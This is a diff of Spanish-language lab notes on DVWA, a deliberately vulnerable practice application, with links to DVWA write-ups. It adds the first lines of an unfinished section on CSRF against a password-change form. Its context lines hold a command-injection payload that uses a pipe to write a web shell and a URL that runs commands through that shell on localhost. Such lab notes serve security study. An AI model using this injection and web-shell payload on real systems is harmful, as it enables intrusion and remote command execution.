@@ -78,6 +78,16 @@ inyectandoi comando (inyectando una web shell): 127.0.0.1|printf '\74\77\160\150
 Testeando la web shell: http://127.0.0.1:8081/vulnerabilities/exec/web_shell.php?cmd=ls+-l
 cambiar el comando cmd al gusto
 
+
+- CSRF: Cross-Site Request Forgery (Falsificación por Solicitud Transversal)
+Es un tipo de ataque que permite a un atacante engañar a un usuario para que realice acciones en una aplicación web en la que está autenticado.
+Viendo como trabaja el formulario de cambio de contraseña, 
+
+es posible crear un enlace para obligar 
+
+
+
+*******************************
 WriteUps
 https://github.com/dev-angelist/Writeups-and-Walkthroughs/blob/main/dvwa
 https://github.com/LeonardoE95/DVWA
